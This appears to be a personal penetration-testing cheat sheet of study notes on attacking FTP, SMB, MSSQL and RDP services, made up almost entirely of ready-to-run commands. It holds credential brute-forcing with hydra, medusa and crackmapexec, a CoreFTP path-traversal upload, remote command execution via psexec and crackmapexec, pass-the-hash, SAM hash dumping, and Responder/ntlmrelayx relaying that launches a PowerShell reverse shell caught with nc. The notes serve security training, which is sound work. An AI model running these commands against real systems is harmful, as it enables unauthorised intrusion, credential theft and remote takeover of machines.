# ATTACKING COMMON SERVICES  

## Attacking FTP

* Port : `21` 
* [FTP footprinting](../HackTheBox/Academy/Footprinting.md)
* Process
    ```bash
    # Process 

    # 1 - Enumeration + footprinting module ftp par
    nmap -sV -sC <IP> -p 21
    # scan
    sudo nmap --script-updatedb 
    find / -type f -name ftp* 2>/dev/null | grep scripts
    nmap -sV -sC -A --script
    # ftp-anon verify log of anonymous
    # ftp-syst display infos
    # script-trace



    # 2 - try anonymous login 
    # interaction as anonymous
    ftp <Target-IP> # username and password  : anonymous



    # 3 - if anonymous is disabled , try bruteforce
    medusa -u <UserName> -P <wordlist> -h <IP> -M ftp 
    # bruteforce alternative with hydra 
    hydra -l <username> -P <dico> ftp://<ftpAddress>

    # 4 - FTP bounce attack
    nmap -Pn -v -n -p80 -b <Username>:<Password>@<Exposed-Target> <Main-Target-Non-Exposed>



    # telecharger tous les fichiers disponible
    wget -m --no-passive ftp://<anonymous | Username >:< anonymous | password>@10.129.14.136/
    ```
* latest vulnerabilities
    * CoreFTP Exploitation ( Path transversal vulnerability)
        ```bash
        curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
        # creer whoops et met POC. à l'interieur
        ```
**Ressource**
[Tools and method to bruteforce ftp](https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/)
## Attacking SMB

* [SMB footprinting](../HackTheBox/Academy/Footprinting.md)

* Misconfigurations
    ```bash
    # scan nmap 
    sudo nmap <IP> -sV -sC -p139,445

    # 1 -  connect to a share
    smbclient -N -L //<Target-IP> --user=<UserName>%<Password>
    # 2 - Enumerate share with smbmap
    smbmap -H <Target-IP> # -r <ShareName> | --< download | upload > "<Share-File-Path>" -u <userName> -p '<Password>'
    # 3 - Domain enum
    rpcclient -U "%" <IP-Target>
    enumdomusers
    # 3 - Alternative
    ./enum4linux-ng.py <IP-Target> -A -C
    ```

- Protocol Specifics Attacks
    ```bash
     # bruteforce
     crackmapexec smb <Target-IP> -u <Wordlist-user> -p '<password>' --local-auth
     
     # RCE
     impacket-psexec <User>:'<Password>'@<Target-IP>
     # RCE with crackmapexec 
     crackmapexec smb <Target-IP> -u <User> -p '<Password>' -x '<whoami | powershell-cmd>' --exec-method smbexec

     #Enumerate logged user 
     crackmapexec smb <Target-IP> -u <User> -p '<Password>' --loggedon-users

     # extract hash from sam db 
     --sam

     # Pass-the-Hash (PtH) : authenticate with remote server via NTLM Hash
     crackmapexec smb <Target-IP> -u <User-Name> -H <HASH>
    ```

- Forced Authentication Attacks
    ```bash
    # Abuse smb
    Forced Authentication Attacks
    responder -I <interface name>

    #2 - copy hash from : /usr/share/responder/logs/

    #3 - Use hashcat 5600 to crack it 
    hashcat -m 5600 <Hash-File> < Wordlist | rockyou >


    # 3 - Crack alternative : impacket-ntlmrelayx
    cat /etc/responder/Responder.conf | grep 'SMB ='
    impacket-ntlmrelayx --no-http-server -smb2support -t <Target-IP>

    # 4 - revershell with https://www.revshells.com/ + Powershell #3
    impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<Powershell-CMD>'
    # in parallel on our marchine
    nc -lvnp 9001
    ```


* latest vulnerabilities
    * [SMBGhost (CVE-2020-0796)](https://www.exploit-db.com/exploits/48537)


## Attacking SQL DB
*  [SQL Basics](../HackTheBox/Academy/SQL%20basics.md)
* [ MSSQL footprinting](../HackTheBox/Academy/Footprinting.md)

* 
    ```bash
     # scan 1
     nmap -Pn -sV -sC -p1433 <IP>
     # scan 2
     sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>

     # connect to sqlserver alternative to other modules
     sqlcmd -S SRVMSSQL -U <Username> -P '<Password>' -y 30 -Y 30

     # alternative 2
     sqsh -S 10.129.203.7 -U <Username> -P '<Password>' -h
     sqsh -S 10.129.203.7 -U .\\<Username> -P '<Password>' -h

     # alternative mssql
     mssqlclient.py Administrator@<IP> -windows-auth

     
    ```

* latest vulnerabilities
    * MSSQL function xp_dirtree : we can intercept the hash with Wireshark of TCPDump... and localy crack it to gain admin privilege


## Attacking RDP

* latest vulnerabilities : 
    * [CVE-2019-0708](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) 
        * ` Bluekeep ` is  : User-After-Free vulnerability `risk blue screen prevent client during pentest`
        * [Article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/)
    

###### SMB
```bash
# connect to share in windows cmd
net use n: \\<IP>\<ShareName> /user:<Username> <Password>
dir \\<IP>\<ShareName>\
# with powershell with credentials
Get-ChildItem \\<IP>\<ShareName>\
$username = '<Username>'
$password = '<Password>'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\<IP>\<ShareName>" -PSProvider "FileSystem"  -Credential $cred

# count number of file powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
# search file powershell
Get-ChildItem -Recurse -Path <DiskPart | N>:\ -Include *<File-Name-Part>* -File

# with windows cmd
dir <Drive-To-search | n>: /a-d /s /b | find /c ":\ "  # ":\" 
# search file windows cmd
dir <Drive-To-search> | n:>\*<File-Name-Part>* /s /b

# search specific word windows cmd
findstr /s /i <Word> <Drive--To-Search | n>:\*.*
# search specific word windows powershell
Get-ChildItem -Recurse -Path <Drive-to-search | N>:\ | Select-String "<Word>" -List


#  mount smb in linux
sudo mkdir /mnt/<ShareName>
sudo apt install cifs-utils
sudo mount -t cifs -o username=<Username>,password=<Password>,domain=. //<IP>/<ShareName> /mnt<ShareName>
# mount with credential file
mount -t cifs //192.168.220.129/<ShareName> /mnt/<ShareName> -o credentials=</path/credentialfile>

#credential file format .(txt)
#username=plaintext
#password=Password123
#domain=.

# search in the share cred files
grep -rn <localSharePath> -ie cred
# search in share a file 
find <localSharePath> -name *<FileNamePart>*
```

###### 

```bash
# install evolution
sudo apt-get install evolution
# if error occur
export WEBKIT_FORCE_SANDBOX=0 && evolution.


```
